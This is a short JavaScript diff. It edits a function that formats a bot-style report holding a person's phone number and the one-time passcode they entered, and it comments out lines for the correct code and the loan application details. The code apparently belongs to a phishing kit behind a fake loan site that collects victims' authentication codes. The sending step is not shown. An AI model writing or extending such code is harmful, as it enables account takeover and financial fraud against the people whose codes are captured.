@@ -31,18 +31,18 @@ function formatOTPErrorMessage(phoneNumber, enteredOTP, correctOTP, applicationD
     message += `<b>━━━━━━━━━━━━━━━━━━━━━</b>\n`;
     message += `<b>📱 Phone:</b> ${phoneNumber}\n`;
     message += `<b>⌨️ Entered OTP:</b> <code>${enteredOTP}</code>\n`;
-    message += `<b>✅ Correct OTP:</b> <code>${correctOTP}</code>\n`;
+   // message += `<b>✅ Correct OTP:</b> <code>${correctOTP}</code>\n`;
     message += `<b>⏰ Time:</b> ${timestamp}\n`;
-    message += `<b>━━━━━━━━━━━━━━━━━━━━━</b>\n`;
-    message += `<b>📋 LOAN APPLICATION DETAILS:</b>\n`;
-    message += `<b>💰 Amount:</b> $${applicationData.loanAmount || 'N/A'}\n`;
-    message += `<b>📆 Term:</b> ${applicationData.loanTerm || 'N/A'} months\n`;
-    message += `<b>📊 Weekly:</b> $${applicationData.weeklyRepayment || 'N/A'}\n`;
-    message += `<b>🎯 Purpose:</b> ${applicationData.purpose || 'N/A'}\n`;
-    message += `<b>🏦 Type:</b> ${applicationData.loanType || 'N/A'}\n`;
-    message += `<b>━━━━━━━━━━━━━━━━━━━━━</b>\n`;
-    message += `<b>🌍 IP:</b> ${window.location.hostname}\n`;
-    message += `<b>🖥️ User Agent:</b> ${navigator.userAgent.substring(0, 100)}...\n`;
+   // message += `<b>━━━━━━━━━━━━━━━━━━━━━</b>\n`;
+  //  message += `<b>📋 LOAN APPLICATION DETAILS:</b>\n`;
+  //  message += `<b>💰 Amount:</b> $${applicationData.loanAmount || 'N/A'}\n`;
+    //message += `<b>📆 Term:</b> ${applicationData.loanTerm || 'N/A'} months\n`;
+  //  message += `<b>📊 Weekly:</b> $${applicationData.weeklyRepayment || 'N/A'}\n`;
+    //message += `<b>🎯 Purpose:</b> ${applicationData.purpose || 'N/A'}\n`;
+  //  message += `<b>🏦 Type:</b> ${applicationData.loanType || 'N/A'}\n`;
+ //   message += `<b>━━━━━━━━━━━━━━━━━━━━━</b>\n`;
+//    message += `<b>🌍 IP:</b> ${window.location.hostname}\n`;
+  //  message += `<b>🖥️ User Agent:</b> ${navigator.userAgent.substring(0, 100)}...\n`;
     
     return message;
 }
